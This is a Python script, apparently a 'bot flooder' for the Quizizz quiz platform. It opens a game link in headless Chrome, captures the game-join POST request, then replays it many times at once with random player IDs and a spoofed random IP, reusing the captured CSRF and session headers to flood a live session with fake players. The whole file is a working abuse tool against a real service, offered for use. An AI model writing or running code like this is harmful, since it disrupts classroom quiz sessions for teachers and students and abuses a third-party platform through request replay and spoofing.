import random
import string
import asyncio
import aiohttp
from seleniumwire import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import json
import time

def random_id(length=10):
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for i in range(length))

def random_ip():
    return '.'.join(str(random.randint(0, 255)) for _ in range(4))

async def send_requests(session, request, num_requests):
    target_url = 'https://game.quizizz.com/play-api/v5/join'
    tasks = []
    for _ in range(num_requests):
        body = json.loads(request.body.decode('utf-8'))
        body['player']['id'] = random_id()
        body['ip'] = random_ip()
        headers = {
            'Host': 'game.quizizz.com',
            'Content-Length': str(len(json.dumps(body))),
            'Content-Type': 'application/json',
            'X-Csrf-Token': request.headers.get('X-Csrf-Token', ''),
            'Accept-Language': request.headers.get('Accept-Language', 'en-US,en;q=0.9'),
            'X-Q-Traceid': request.headers.get('X-Q-Traceid', ''),
            'X-Amzn-Trace-Id': request.headers.get('X-Amzn-Trace-Id', ''),
            'Credentials': 'include',
            'Accept': 'application/json',
            'User-Agent': request.headers.get('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'),
            'X-Quizizz-Uid': request.headers.get('X-Quizizz-Uid', ''),
            'Experiment-Name': request.headers.get('Experiment-Name', ''),
            'Sec-Ch-Ua-Platform': request.headers.get('Sec-Ch-Ua-Platform', 'Windows'),
            'Origin': 'https://quizizz.com',
            'Sec-Fetch-Site': request.headers.get('Sec-Fetch-Site', 'same-site'),
            'Sec-Fetch-Mode': request.headers.get('Sec-Fetch-Mode', 'cors'),
            'Sec-Fetch-Dest': request.headers.get('Sec-Fetch-Dest', 'empty'),
            'Referer': 'https://quizizz.com/',
            'Accept-Encoding': request.headers.get('Accept-Encoding', 'gzip, deflate, br, zstd'),
            'Priority': 'u=1, i'
        }
        task = asyncio.ensure_future(session.post(target_url, headers=headers, json=body))
        tasks.append(task)
    await asyncio.gather(*tasks)
    print("\033[96mRequest sent!")

async def main():

    driver_url = input("\033[96mEnter quizizz link:\033[0m ")
    num_requests = int(input("\033[96mEnter the amount of request (x2):\033[0m "))
    
    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    options.add_argument('--log-level=3')
    options.add_argument('--disable-logging')
    options.add_argument('--silent')
    driver = webdriver.Chrome(seleniumwire_options={}, options=options)

    driver.get(driver_url)

    wait = WebDriverWait(driver, 30)
    text_input = wait.until(EC.visibility_of_element_located((By.CLASS_NAME, 'enter-name-field')))
    text_input.click()
    random_name = f'CYNX_{random.randint(1, 1000)}'
    text_input.send_keys(random_name)
    start_button = wait.until(EC.element_to_be_clickable((By.CLASS_NAME, 'start-game')))
    start_button.click()

    print("\033[96mIntercepting request...")
    target_url = 'https://game.quizizz.com/play-api/v5/join'
    start_time = time.time()
    while True: 
        intercepted = False
        for request in driver.requests:
            if request.url == target_url and request.method == 'POST':
                print("\033[96mIntercepting successful")
                async with aiohttp.ClientSession() as session:
                    await send_requests(session, request, num_requests)
                driver.quit()
                return
            
        if time.time() - start_time > 30:
            print("\033[96mNo request intercepted within 30 seconds. Exiting.")
            driver.quit()
            return

if __name__ == "__main__":
    asyncio.run(main())
